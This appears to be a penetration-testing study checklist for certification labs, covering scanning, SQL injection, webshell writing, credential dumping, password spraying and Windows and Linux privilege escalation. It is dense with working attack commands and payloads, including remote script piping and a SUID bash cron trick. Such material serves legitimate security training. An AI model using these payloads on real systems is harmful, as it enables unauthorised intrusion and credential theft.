# Master Checklist
This document contains all of the possible pathways to explore when you feel like you're out of options trying to get something out of an attack surface.

[Absolute Failure? Use This](https://ippsec.rocks/?#)
[Reverse Shells](https://www.revshells.com/)
[UAC bypass](https://github.com/hfiref0x/UACME) / [FOD helper](https://gist.github.com/netbiosX/a114f8822eb20b115e33db55deee6692)

Privilege Escalation links from **S1ren**:
- [Linux](https://sirensecurity.io/blog/linux-privilege-escalation-resources/)
- [Windows](https://sirensecurity.io/blog/windows-privilege-escalation-resources/)

Other cheat sheets to check if desperate:
- [0xsyr0](https://github.com/0xsyr0/oscp?tab=readme-ov-file#ftp)
- [saisathvik1](https://github.com/saisathvik1/OSCP-Cheatsheet?tab=readme-ov-file)

Fast password cracking: Just use [crackstation.net](https://crackstation.net/)

---
# Methodology
**NMAP** -> **Initial Access** -> **Priv Esc** -> **Flag** -> **Repeat**

> [!Danger] REPORT
> - Document **ALL** steps in your attacks! Record **ALL** commands!
> - Screenshot **ALL** command console output!
> - If you do *not* need to modify an exploit, **ONLY** provide the exploit URL
> - If you have to modify an exploit, include the **URL**, **explanation of all changes**, and **highlight the changes within your screenshot**

> [!Danger] REPORT - Flags
> - Both **proof.txt** and **local.txt** MUST be read with `cat` or `type` **FROM** the original location!
> - Flags **CANNOT** be read from a web-based shell!
> 	- Shell must be running as **SYSTEM**, **Administrator**, **User with Admin** privileges (or local user for local.txt)

> [!Danger] REPORT - Screenshot Requirements
> Every flag file screenshot must include the contents of the file AND the **IP address** (`ifconfig`, `ipconfig`, `ip addr`)
> 

> [!Warning] Meterpreter
> Meterpreter/Metasploit (Auxiliary, Exploit, Post) can only be used against ONE machine. You can use it as many times as you want against your target machine.





---
**Don't Forget:**
- You should try to use [[Impacket#secretsdump - hashes|Impacket]] as [[Mimikatz]] straight from Kali, instead of having to use Mimikatz and moving it over
	- If running within [[evil-winrm]], run your arguments inline like `.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"`
- [[Impacket]]
- [wmiexec](https://github.com/ice-wzl/wmiexec2)
- [[Netexec]] / `nxc`
- [[evil-winrm]] 
- [[Impacket#GetUserSPNs|GetUserSPNs]]
- LDAPsearch or [query ldap with netexec](https://www.netexec.wiki/ldap-protocol/query-ldap])
- `powershell -ep bypass`
- What accounts are logged in on a box? Those are the ones you can likely obtain hashes with via [[Mimikatz]]
- You can probably crack hashes with https://crackstation.net/
	- If you can't, maybe the hashes are still valuable in a **PtH** sense If you can't crack it here, they ain't meant to be cracked

- Add passwords and usernames you find to *password.txt* and *usernames.txt* files. If dealing with AD, blast them all across [[Netexec]] against every IP to see what accounts have access to which IPs with `nxc smb <ip> -u <user.txt> -p <passwd.txt>`
	- Then THINK - how can you login to those machines? Think about all your options - RDP, SSH, evil-winrm, impacket-psexec, etc etc


When trying to authenticate with a handful of **usernames**, remember:
- Try "password" and "admin" and "administrator"
- Try the name of the user like `Cassie` and `cassie` as both username and password
- Try `Admin::Admin` and `admin::admin` and mix the two up, etc

---
# 1. NMAP Scanning
[[NMAP]] scans in the following order:
1. `sudo nmap -sV <IP> -T5` - plain, scans top 1000 ports. Can leave the **-T5** off if you want
2. `sudo nmap -A -p- <IP> -T5` - the mega scan. The `-A` will run all enumeration scripts, showing ssh keys too. Add `-sC` if paranoid, but the **-A** should include it.
3. **UDP scan:** `sudo nmap -F -sU -sV <IP>` - Run if the results from regular scan don't look like they give you much of a way in. **OR** if you're looking for **SNMP**

To run different groups of **non-standard/default** scripts, see [this article](https://nmap.org/book/man-nse.html). They will ultimately include `nmap --script <"descriptors">`
## Ports 
Remember to **google** random/unknown/strange ports you see open if you have hit a dead end - there may be an exploitable service running on it!

| Port     | Service        | Notes                                                                                                                           |
| -------- | -------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| 80       | **HTTP**       | - Webpage                                                                                                                       |
| 5985     | **WinRM**      | - [[evil-winrm]]                                                                                                                |
| 22       | **SSH**        | - SSH                                                                                                                           |
| 139, 445 | **SMB**        | - Enumerate with [[smbclient]], [[SMB Enumeration\|nbtscan]], <br>- **Authenticate** using [[Impacket#psexec\|impacket-psexec]] |
| 3389     | **RDP**        | - xfreerdp                                                                                                                      |
| 1978     | **Wifi mouse** | - exploitable                                                                                                                   |
| 161 UDP  | **SNMP**       | - Enumerate with [[snmpwalk]]<br>- Know that Kali has other **snmp** tools too                                                  |

> [!Danger] Remember to run `netstat -ano` or `netstat -anolp` once on a target!
> There may be **other services you couldn't see from the outside**, especially if the target was on the internal network. You may be able to access them easily this way.

> [!note] Attempt default logins for random services if possible
> Like FTP, if there are other strange ports open that correspond to services, **Google what their default logins** might be and try them.

> [!Warning] Investigate webpages last!
> You may be able to entirely avoid messing with HTTP/HTTP if there appear to be other ways in. Attack the webpages last, start with easier, more apparat things first.




Jump to:
- Webpage





---
# Webpage
- [ ] If you have access to an HTTP server and it redirects you to a hostname like `https://oscp:20000`, make sure you add it and its IP to your `/etc/hosts` file like so:
	- [ ] `sudo vim /etc/hosts`
	- Should look like `192.168.151.157 oscp` where the **IP** is the address and  '**oscp**' is the domain name separated by a single `tab`
## Web Developer Tools
- [ ] Inspect the **network** requests and responses using the **network** tab?
	- You can inspect **headers** for odd information or flags after refreshing the page when using this tool
- [ ] Check for possible files/file locations within the URLs of the network **headers**? 
	- You can copy and paste these files into the URL search to see if they hold extra data or flags
- [ ] Explored each page with the **inspection** tool?
- [ ] Checked both the **/robots.txt** and **/sitemap.xml** pages appended to the URL?
- [ ] Have you checked web directories with [[FFUF]] or [[dirsearch]]?
	- [ ] **cd** into the **dirsearch** directory, then run `./dirsearch.py -u <target_ip:port> -r`
	- Try [[wordlists|wordlist]] `/usr/share/wfuzz/wordlists/general/megabeast.txt`
	- Try [[wordlists|wordlist]] `/usr/share//wordlists/dirb/big.txt`
	- Try [[wordlist]] `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt

- [ ] Run [[feroxbuster]] with a command like `feroxbuster --url http://<ip>:<port>`
	- [ ] You can specify the mega directory wordlist with `feroxbuster --url http://<ip>:<port> -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt`
	- [ ] If you figure out the tech behind something, not a bad idea to try finding a specific **seclist** that is aimed at that specific tech, then running it again with that.

## Directory Traversal Attack Vectors
- [ ] Are there any webpages that will accept input, such as: `.com/index.php?page=admin.php`?
- [ ] If target is Linux, try to pad all available locations with` /etc/passwd` using `../../../../../` padding
	- [ ] If identified, try to locate and steal any potential SSH keys within the *users home directories* which could be [[SSH - 22#Using Stolen Private SSH Keys to Login|used to log in]]
- [ ] If Windows, try to pad all available locations with **C:\Windows\System32\drivers\etc\hosts** 
	- If you think an IIS web server is running, check the following as well:
		- **C:\inetpub\logs\LogFiles\W3SVC1\**
		- **C:\inetpub\wwwroot\web.config**
		- Investigate with both ../../../../ *and* ..\..\..\..\ for Windows
- [ ] Complete the above directory traversal attacks, but use [[Directory Traversal Attacks#Encoding Special Characters|URL encoding]] and/or [use this link](https://www.urlencoder.org/) with UTF-8

## Local File Inclusion Vulnerabilities
- [ ] Using [[nmap]], check for a potentially vulnerable Apache server running. Check to see if [[Local File Inclusion#Inserting Our Code / Log Poisoning|log poisoning]] may be possible by abusing the **access.log**:
`http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log`
- If log can be poisoned, try creating a reverse shell into the target as is done [[Local File Inclusion#Bash Reverse Shell|here]]
- [ ] [[Curl]] with [[PHP Wrappers]] to see if you can extract any hidden information inside php files within the URLs of a webserver (look for URLs that end with "index.php?page=[xyz.php]")
	- [ ] Insert **php://filter/convert.base64-encode/resource=**[xyz.php] to see if there is hidden base64 within the php file (then `echo [ base64 text] | base64 -d)` to decode it
	- [ ] Insert **data://** and our [[PHP Wrappers#Base64 Encoding|encoded PHP snippet]] to see if you can run remote commands

### Remote File Inclusion Vulnerabilities
- Likely not required, but reference [[Remote File Inclusion|this short note]]

## File Upload
- [ ] Determine if there is an **upload page** on the web server
- [ ] What is the backend of the webpage? **PHP**? **ASP**? **ASPX**? Use Burp and enumerate to try to see what it is - an upload POST request may return a response in Burp that tells you what it is
	- [ ] Can we upload [[PHP]] files like our backdoor from [[Remote File Inclusion#simple-backdoor.php|here]]?
		- [ ] If PHP files are filtered, can we get around the filter by [[File Upload (Executable)#Example - Reverse Shell, RCE|flipping the extension case]]?
- [ ] Is there no way to *execute an upload*, but there *is* an upload box? Try to upload an [[SSH - 22|SSH]] key pair to see if we can establish a session using [[File Upload (Non-Executable)#Example|this method]]
- [ ] You may be able to upload one of the ASP [[Webshells#ASP Webshells|webshells]] and execute commands wherever the file is stored

## OS Command Injection
- [ ] Is there an input box which might run code on the OS backend, like a [[OS Command Injection|git repository clone]] function?
	- [ ] Prod for responses (ipconfig, help, version, ls). Attempt a combination of injections with `&&whoami`, `"&&whoami"` and `"&& whoami"`, `";whoami"` etc. Try enclosing command in **quotes** too. If you can run these commands but not others, there must be filtering happening.
		- [ ] If so, use Burp to view the actual request and response data to see what field/parameter is where the data enters
	- [ ] Use [[curl]] to send a POST request with semicolon encoding (**%3B**) as done [[OS Command Injection#OS Detection / Semicolon Encoding|here]] to detect what the backend shell is (PowerShell or CMD?). If you can get an executed response, then..
	- [ ] Try and establish a reverse shell using [[Powercat]]

## SQL Injection

### MySQL
Found [[SQL Basics#MySQL|here]]:
- [ ] Use `mysql -u [username] -p ['password'] -h [IP] -P [port]` to login to a MYSQL service if possible. Default creds would be `root::root`
	- [ ] `select version();` shows SQL version
	- [ ] `select system_user();`  shows current user
	- [ ] `show databases;` shows all databases
		- [ ] You could then use `SELECT * FROM <database-name>.users;` to see users in each database
	- [ ] `SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';` selects an item (*user*) **FROM** a table (*mysql.user*) **WHERE** the username is *offsec*. If you know what values you want to see, add them after **SELECT** separated by commas

### MSSQL /SQLCMD
Found [[SQL Basics#MSSQL / SQLCMD|here]]:
- [ ] You could login with `impacket-mssqlclient [username]:[password]@[IP-addr] -windows-auth` if you have credentials. If there are multiple ports open, specify port with `-port <port#>` at the end of the command
	- Careful, as when running these commands locally, each command would end with a `;` followed by the command `GO` on the next line
- [ ] `SELECT @@version;` shows version
- [ ] `SELECT name FROM sys.databases;` shows names from **sys.databases**. We would want to investigate custom **databases** that are NOT *master*, *tempdb*, *model*, *msdb*
	- [ ] `SELECT * FROM [databasename].information_schema.tables;` to print **all** **tables** in the specified **database**
	- [ ] `select * from offsec.dbo.users;` selects **all** from `[database].dbo.[table]`

### Error Based Payloads
Found [[Identifying Error-based Payloads|here]]:
- [ ] Run `gamer' OR 1=1 -- //` and `'gamer` all over the place
	- [ ] Or `SELECT * FROM users WHERE user_name= 'gamer' OR 1=1 --`

- [ ] If there is a login box on the webpage, login with bad credentials to see if the **error** can identify **SQL**
	- [ ] Try with a close quote like `gamer'`**!!!**
	- [ ] If you get an SQL error, enter  `gamer' OR 1=1 -- //` in the username box
		- An error containing ``System.Data.SqlClient.SqlException`` identifies [[SQL Basics#MSSQL / SQLCMD|MSSQL]] 
	- [ ] From there, enter queries after the close quote statement like `' or 1=1 in (select @@version) -- //` and see if the info you're testing (*version*) is printed. If yes, then **you can query the SQL database from here**
		- [ ] `' OR 1=1 in (SELECT * FROM users) -- //`
		- [ ] `' or 1=1 in (SELECT password FROM users) -- //`
		- [ ] `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`

#### UNION Statements
Continue with [[UNION-Based Payloads|this note]]:
- [ ] `$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";` where **customers** should be changed to reflect your target **table** name
	- [ ]  You have to find the [[UNION-Based Payloads#Finding Number of Columns|number of columns]] by repeatedly inputting `' ORDER BY 1-- //` and **increasing** the integer **by** **one** until you get an unknown column fail message. Then, reduce by one and this will be your number of columns. **Pad the following queries with the remaining number of "null"'s that should be used**
	- [ ] `%' UNION SELECT database(), user(), @@version, null, null -- //` - if info is missing in the print, pad on the opposite side like...
		- [ ] `' UNION SELECT null, null, database(), user(), @@version  -- //`
- [ ] Query the big leagues with `' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //`
	-  *table_name, column_name, table_schema* should be searchable from the **WHERE** `table_schema=database()` because it's universal
	- Note to keep the **null** padding required
	- [ ] If you get good results back, run `' UNION SELECT null, username, password, description, null FROM users -- //` where "**users**" is the **table**, the other items are the info you want printed like *username*, *password*, etc
	- [ ] Search for userdata, hashes, etc this way
- [ ] We can append the payload **AND 1=1 -- //** to the URL `http://192.168.50.16/blindsqli.php?user=offsec' AND 1=1 -- //`
	- Since **1=1 is true** and we are using an AND statement, the response will only be returned if the initial statement is true, too. We could **plug other usernames in** here and we could verify whether or not the user exists this way.

### Manual Code Injection
Found [[Manual Code Execution|here]]. For **MSSQL**, enable **xp_cmdshell**:
- [ ] If you have credentials, you can try `impacket-mssqlclient [username]:[password]@[ip] -windows-auth`. Then run:
	1. `EXECUTE sp_configure 'show advanced options', 1;`
	2. `RECONFIGURE;`
	3. `EXECUTE sp_configure 'xp_cmdshell', 1;`
	4. `RECONFIGURE;`

If you have access only through an input box, try:
```
gamer'; EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE; EXECUTE sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- //
```
- These are the same four commands above, but be sure each command is closed with `;`
- In a statement injection like this, the `--` is required to close the entire statement

- [ ] If this works, you should be able to execute any Windows shell commands via the **EXECUTE** statement like `EXECUTE xp_cmdshell 'whoami';` from the SQL prompt		
- [ ] From here, you should upgrade to a [[reverse shell]]
#### For [[Manual Code Execution#MySQL|MySQL]]:
- [ ] You have to first find the [[UNION-Based Payloads#Finding Number of Columns|number of columns]] by repeatedly inputting `' ORDER BY 1-- //` and **increasing** the integer **by** **one** until you get an unknown column fail message. Then, reduce by one and this will be your number of columns.
	- [ ] If there is a **writable** **location** on the web server, use `' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //` - the number of "**null**" parameters should pad to match the number of **columns** previously found
		- The `/var/www/html/tmp/webshell.php` is the writable location. Change to reflect target location
		- [ ] Fatal error should show, but payload should be landed
		- [ ] Enter  `192.168.120.123/tmp/webshell.php?cmd=id`, where **id** is the command you want to run, into the URL box
			- [ ] If it works, you should be able to execute any command you want as *www-data*

---
# Public Exploits
- [ ] Is there a login page or another page which exposes **any kind of specific web application** that might be vulnerable to public exploits via [[Offline Exploit Resources#SearchSploit|SearchSploit]] or [[NMAP#Nmap Scripts|NMAP NSE Scripts]]?
	- [ ] Be sure to check the source code of the suspected pages to find the **web app** and **version**
	- [ ] Search with Google, [[Offline Exploit Resources|searchsploit]] and [Exploit-DB](https://www.exploit-db.com/)
		- [ ] `searchsploit <keyword>` and then to copy an exploit to your current working directory, `searchsploit -m <path-of-exploit>`
- [ ] Google `github poc <exploit here>` for the most up-to-date potential exploits

---
# Password Attacks

> [!Critical] Add all found usernames and passwords to respective text files
> Create something like *users.txt* and *pass.txt* to use when scanning/spraying later on whether it be with [[Netexec]], [[THC Hydra|Hydra]], etc. When trying to brute force remember to include lowercase and uppercase versions of usernames (i.e. name "Cassie" could be used as "cassie" to log in.) Include Administrator/administrator in your users text file too

Remember to try things like:
- `admin::admin` or `Administrator::Administrator` or `administrator::administrator`
- `Cassie::password` or `Cassie::Cassie` or `cassie::cassie` etc

## Password Attacks
- [ ] Do you have user **account names** that you might be able to crack with a [[SSH, RDP, HTTP Password Attacks|dictionary attack]] via [[THC Hydra|Hydra]] and a verified target port running SSH, RDP, FTP, or HTTP?
	- [ ] Run `anonymous::anonymous` and `admin::admin` and `ftp::ftp` and `username::username` or `Username::username` and mix and match
	- [ ] If the only potential vector is HTTP, have you tried to crack the default *admin* account?
		- [ ] What application software is running on the login page?
- [ ]  Are there any **passwords** you have found? Leverage each one with [[SSH, RDP, HTTP Password Attacks#RDP - Password Spraying|password spraying]] if possible via [[THC Hydra|Hydra]]
- [ ] Can you enumerate the box for accounts to target for password cracking? (including *root* and *Administrator* default accounts)
- [ ] Do we know the password policy? If so, use [[Mutating Wordlists#Mutating Wordlists / Rule-Based Attacks|mutating wordlists]] to reconfigure a password list for a potential password attack.

## Password Managers
- [ ] Are there any password managers installed on the system? Make sure to check (if GUI access, via *Apps & Features* on Windows)
	- [ ] If so, what is the database file extension? Can you locate it/them?
	- [ ] Can you move the database file to your system and crack it's passcode as done [[Password Cracking, Managers#Password Managers|here]]?

## Password Cracking / Mimikatz with Privileged User
- [ ] Check user accounts (Windows - *Get-LocalUser*) 
	- [ ] Does any user have *SeDebugPrivilege*?
	- [ ] Do you have local admin (which will have *SeImpersonatePrivilege*?) Run **whoami /all** to determine whether or not your current user is in the Administrators group. if yes to either, move [[Mimikatz]] and elevate privileges to grab hashes or plaintext passwords
		- [ ]  Remember for NTLM hashes, only the last half is the hash after the `:`
	- [ ] You could also, from your Kali, run `impacket-secretsdump <username>:<password>@<ip-address>` instead via [[Impacket#secretsdump - hashes|secretsdump]] - much easier
- [ ] Are there possibly accounts shared between multiple computers in the network?
	- [ ] Can you obtain the **NTLM** hashes with [[Mimikatz]]?
	- [ ] Are there any SMB shares which could be accessed with [[Smbclient]] and [[Cracking & Passing NTLM#Passing NTLM|passing the hash]]?
	- [ ] Can you utilize the NTLM hashes to obtain an interactive shell with [[Impacket#impacket-psexec|impacket-psexec]] (SYSTEM) or [[Impacket#impacket-wmiexec|impacket-wmiexec]] (UESR)? 
		- [ ] `impacket-psexec <user>@<target-ip>` - remember you can upload and download files with `lput` and `lget` within here
- [ ] Do you have access to **SYSTEM** and **SAM** keys but not privs to use Mimikatz/secretsdump on the box? Normally these are stored in `C:\Windows\system32\`, but if you find them elsewhere and you can download/copy them to Kali and crack them offline with [[Impacket#secretsdump - hashes|secretsdump]]:
	- `impacket-secretsdump -system SYSTEM -sam SAM LOCAL` 

## Password Cracking without Privileged User
- [ ] Do we have any kind of basic trash-tier access to a shell on a target system? Do we want the actual credentials for an unprivileged user which might be able to log into other systems?
	- [ ] Try to use [[Responder]] to crack the [[Net-NTLMv2 - Cracking|Net-NTLMv2]] after obtaining a reverse shell / bind shell from the target to your system
- [ ] Is there an upload webpage that you could use to access [[Net-NTLMv2 - Cracking#Example II - Webpage|your SMB server set up via Responder]]? 
- [ ] Can you [[Net-NTLMv2 - Relaying|relay a Net-NTLMv2]] hash to another machine?

---
# Windows

## Enumeration
> [!warning] Make sure you check the C:\ drive for unusual folders!
> - Windows
> - Program Files
> - Program Files (x86)
> - Public
> - System32
> - SysWOW64
> - Users

**Check**:
1. `gci C:\`
2. `gci C:\users\ -r`
### Automatic Enumeration
- [ ] Can you get a binary onto the system? Utilize [[winPEAS & Seatbelt]] or [[JAWS]]
### Basic Manual Enumeration
Utilize the commands in [[Windows Enumeration]] to enumerate a Windows box:
- [ ] `whoami`
- [ ] `whoami /priv` to see your privileges
- [ ] `whoami /groups` to see group info for current user
- [ ] `net user` or `get-localuser` to **view all local users**
- [ ] `net user <username>` to **see group memberships** and other info of  specified user
- [ ] `ipconfig` to see if you have an internal IP address (if you do, you're connected to an internal network)
- [ ] `net localgroup` to **show all local groups** - are there any of particular interest?
- [ ] `Get-LocalGroupMember \<group name>` to show **all the users within the specified group**
- [ ] `route print` and `netstat -ano` to check for any odd **open and active ports** or **connections to other networks**
- [ ] `Get-Service` to see **services** with PowerShell 
- [ ] Check to see what **applications** are installed by running both commands:
	- [ ] **32-bit**: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- [ ] **64-bit**:  `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		- [ ] Are there any [[Offline Exploit Resources|offline exploits]] or [[Online Exploit Resources|online exploits]] available for the versions of these applications?
		- [ ] Are there any [[Password Cracking, Managers|password managers]] installed?
- [ ] `Get-Process` and `tasklist` to see **running processes**
- [ ] Do we have GUI access to the box, can we use [[Windows Enumeration#Runas|runas]] to open a new shell as a privileged user?
- [ ] What users are in privileged groups or in **remote access groups** which could enable us to use them on other machines? 
- [ ] If you have credentials you can use with [[Impacket#psexec|psexec]] (port **445**), you can `impacket-psexec <usrname>@<ip-target>` to see what shares might be available (even if the logon fails)
	- [ ] You could then use [[Smbclient]] to check an special shares with `smbclient -U <user> \\\\<ip-target>\\<share-name>`

### Advanced File Search
Use the [[Windows Enumeration#File Search (Recursive)|following commands]] to search for different filetypes in different directoreis which may contain passwords, login information, and other useful data:
- [ ] `Get-ChildItem -Path C:\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
	- Change the file extensions to what you want to target
	- Change the path to where you'd like to search specifically, or search everything like a dummy by making it **C:\**
- [ ] If you have a shell on a target machine, check their [[PowerShell Script Block Info|PowerShell history]] to see if there are any hints or pointers to credentials there
	- [ ] Can [[evil-winrm]] be used to move to another machine with any of these credentials? Check to see if **5985** & **5986** are open to do this.
- [ ] If you find strange files, like PDFs, you can use [[Target Recon#Information Gathering|exiftool]] on the files once downloaded to your Kali, like so `exiftool <file.pdf>`

## Privilege Escalation
### PowerShell History
- [ ] Check your user's PowerShell history with `Get-History` 
- [ ] If the PowerShell history has been deleted, you can run `(Get-PSReadlineOption).HistorySavePath` and then `cat`/`type` the [[PowerShell Script Block Info#Viewing Deleted PowerShell History|resulting file]] 
> [!Important] Use SSH
> For some reason you **can't view the PowerShell history through WinRM**. Best to start another shell via SSH, run a command in PowerShell, then find and read the PowerShell history


### Service Hijacking & DLL Hijacking
- [ ] Are there any services we might be able to [[Service Hijacking|hijack]] that we have (F)full privileges on? Use `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}` to see running services
- [ ] Run [[winPEAS & Seatbelt|winPEAS]] to see if there are any folders or files you have good permissions to write to
	- [ ] Use [[icacls]] to determine whether or not you have full r/w/x/f rights (also use `whoami /groups` to ensure you're part of the group you're looking at)
	- [ ] View the **owner** of a file with PowerShell's `Get-Acl <filename>`
	- [ ] Can we cross compile our **[[Service Hijacking#Creating Malicious Binary (adduser.exe)|adduser.exe]]** and deliver it in place of the service executable?
	- [ ] Can we use [[Service Hijacking#PowerUp.ps1|PowerUp.ps1]] to help find vulnerable services? ([[PowerSploit Framework]])
- [ ] After [[Windows Enumeration#Show Installed Applications|enumerating installed applications]] with:
		- [ ] **32-bit**: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
		- [ ] **64-bit**:  `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
	- [ ] Do any of these contain DLL hijacking vulnerabilities? Check with [[Offline Exploit Resources|searchsploit]]
	- [ ] Can we move **procmon** onto the target system in order to see if any suspicious services reach out to other DLLs that we might be able to [[DLL Hijacking]]
	- [ ] If they have a vulnerability, can we write to the necessary directory?
	- [ ] Can we create and [[DLL Hijacking|replace with a malicious DLL]]?
- [ ] Using [[evil-winrm]] you can run the command `services` to enumerate services. You can try to start or run services with the command `sc.exe start <service-name>`
	- [ ] If winPEAS shows an executable that you can write to, make sure you check to see if it is a service OR if it is started BY a service
	- [ ] If it is, you may be able to replace the binary with a **reverse shell**, start the service (otherwise launching the executable) in order to privilege escalate, depending on who owns the exe/service

## Unquoted Service Paths
- [ ] If we can move [[PowerSploit Framework#PowerUp.ps1|PowerUp.ps1]] onto the box, can we search under **Invoke-AllChecks** for [[unquoted service paths]] - are there any services we can abuse this way?
	- [ ] Are we able to start/stop the service with PowerShell & `Start-Service <servicename>` & `Stop-Service <servicename>`
	- [ ] If yes, what folder in the unquoted path of the service can we **write** & **execute** to? Check down the path with [[icacls]]
	- [ ] Set up python server
	- [ ] [[Unquoted Service Paths#Moving adduser.exe Onto the Target|Move adduser.exe]] (or another exploit compiled for the correct *target Windows version*) to the target, rename it to a name which will execute when the service is started
	- [ ] Start the service to exploit, adding an admin user onto the machine within the admin group. You should have a local admin now.

## Scheduled Tasks
- [ ] [[Abusing Scheduled Tasks|Check scheduled tasks]] with `schtasks /query /fo LIST /v` or `Get-ScheduledTask` and inspects tasks that may occur periodically (or depend on a condition feasibly satisfied by you)
	- [ ] Look specifically at *Author*, *TaskName, Last Runtime, Next Runtime, Task To Run*
	- [ ] After identifying potential task, check permissions of the task executable with [[icacls]] to see if we can write (or execute) in that location with our user 
	- [ ] Move an exploit like [[Service Hijacking#Creating Malicious Binary (adduser.exe)|adduser.exe]] onto the system. Remove/move original binary, replace it with our exploit and wait for the task to run to execute our binary

> [!Warning] Scheduled tasks are tied to users!
> If you have multiple sets of credentials for a single box and are investigating scheduled tasks, log out and in with the other users to see if the **task is being run in the context of another user**.
- **Autorunsc** upload to target?


## User Privileges / Potato / Spooler
- [ ] Do you have access to a user (check local admins) with *SeImpersonatePrivilege*? Check with `whoami /priv`:
	- [ ] If so, can you move [[Potatoes & PrintSpoofer#SigmaPotato|SigmaPotato]] onto the system [[Offense/Offsec PEN-200/Privilege Escalation - Windows/Kernel Exploits#SeImpersonatePrivilege|with this method]] and obtain a system shell?
	- [ ] You could also try using [[Potatoes & PrintSpoofer#GodPotato|GodPotato]] instead or [[Potatoes & PrintSpoofer#PrintSpoofer.exe|PrintSpoofer]] to get a SYSTEM shell
		- [ ] If you can get GodPotato, you're SYSTEM... so then you should be able to use it to get user accounts with [[Mimikatz]]. Syntax is `./godpotato.exe -cmd "<command>"`
		- [ ] `./printspoofer.exe -i -c "powershell.exe"` 

---
# Linux
## Enumeration
### Automated
- [ ] Can you [[File Transfer Methods#Python's *http.server*|move]] [[linPEAS]] onto the target system and run it? You can also simply run `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh` without moving the file, if the target is connected to the web
- [ ] Can you [[File Transfer Methods#Python's *http.server*|move]] [[unix-privesc-check]] onto the target system and run it?
- [ ] `sudo -l` & `sudo su` every time
- [ ] Don't forget to check `cd /root`
- [ ] Check `/home` to see if other users have info on the box *especially* checking for SSH **id_rsa** keys. 
	- [ ] Make sure when you're searching you use `ls -lisa` to show *hidden files*
	- [ ] You can authenticate via SSH with a user's private **id_rsa** key with the command `ssh -i id_rsa <username>>@<target-ip>`. Keep in mind you likely won't know who the key belongs to, so try it with all available users
- [ ] Are there other user home directories? Check with `dir /home
	- [ ] See if you can impersonate other users with `su <other-user's-name>`
		- [ ] Maybe you (*they*) can then run `sudo su` 
- [ ] Are there any strange files in `/tmp` or `/opt`?

### Shell Upgrade
If you obtain a **dumb shell** on a linux box you can upgrade the shell with Python with the command `python -c 'import pty; pty.spawn("/bin/bash")'`, which should then allow you to run `su`

If you have a low tier shell and no other access back and forth to the box except via some crack exploit, you can use **curl** to send files to the box or **wget**:
- [ ] Set up a python server on your box with `python -m http.server 1337`
- [ ] Run `wget <kali-ip>:<1337>\`

### Manual
- Complete basic manual enumeration:
	- [ ] Current user `id`
	- [ ] Try `sudo su` for root shell
	- [ ] Hostname `hostname`
	- [ ] Enumerate all users `cat /etc/passwd` or `cd /home` then `ls`
	- [ ] System information `uname -a`
	- [ ] Kernel information `cat /etc/issue`
	- [ ] Check running processes `ps aux`
	- [ ] Check what other networks we are attached to `ip a`
	- [ ] Listening ports, active connections `ss -anp`
	- [ ] List firewall rules `iptables`
	- [ ] Check for scheduled tasks with `ls -lah /etc/cron*` (maybe focus on hourly)
	- [ ] Check admin created scheduled tasks `sudo crontab -l`
	- [ ] See installed applications `dkpg -l`
	- [ ] Use `ls -lisa <file/directory/program>` to check my permissions on the file

## Privilege Escalation
### Insecure Privileges
- [GTFOBins](https://gtfobins.github.io/)
- [ ] Check for [[Linux Enumeration#Identifying Files With Insecure Privileges|files with insecure privileges]] with `find / -writable -type d 2>/dev/null`(directories) or `find / -writable -type f 2>/dev/null`(files) 
	- [ ] If **/etc/passwd** is writable, we could use [[openssl]] to [[Password Authentication Abuse#Example|create a new root user]]
- [ ] Are there hidden mounted drives? Use `cat /etc/fstab` and `mount` and use `lsblk` to see if there are unmounted partitions that may [[Linux Enumeration#All Available Disks|have hidden files on them]]


### SUID / GUID Abuse
- [ ] Check for [[SUID & GUID Abuse]] that you might be able to abuse with `find / -perm -u=s -type f 2>/dev/null`
	- [ ] Are there misconfigured program/commands? Can you utilize the method [[SUID & GUID Abuse#Example|here]] to execute a root shell with a program by adding `-exec "/usr/bin/bash" -p \;`
	- [ ] Are there any [[SUID & GUID Abuse#Linux Capabilities|misconfigured binaries]] we could abuse? Run `getcap` with `/usr/sbin/getcap -r / 2>/dev/null` and utilize [[SUID & GUID Abuse#GTFOBins|GTFOBins]]
- [ ] Are there any [[User Trails#.bashrc|dotfiles (like .bashrc)]] for the user we have access to that might be holding variables with credentials in them?
	- [ ] Run `env`, inspect, then cross-reference with `cat .bashrc` 
- [ ] What can be done with `sudo -l`? Can we use any of the allowed privileges for our current account on target [[Sudo Abuse|with GTFOBins]]?

### Cron Abuse
- [ ] Can you `grep "CRON" /var/log/syslog` to see if there are any scripts running in jobs that we might be able to [[Cron Job Abuse|abuse]]?
	- [ ] Check specifically for jobs executed often (each minute)
	- [ ] Do any of the scripts have read/write/execute permissions set? Check with `ls -lisa <job script path>`
	- [ ] Can we input a script like `echo 'chmod u+s /bin/bash' > /job/script/file.sh` to initiate a root bash shell with the [[Cron Job Abuse#Sticky Bit Exploit|sticky bit?]]
- [ ] To see all cron jobs, look at `ls -lah /etc/cron*` - all cron jobs are in spearate directories like **cron.d** or **cron.hourly** or **cron.daily** etc - each one containing the respective jobs
	- [ ] Can you alter any of these jobs?
	- [ ] Can you alter their path files to do something you'd like as *root*, like run a root shell?
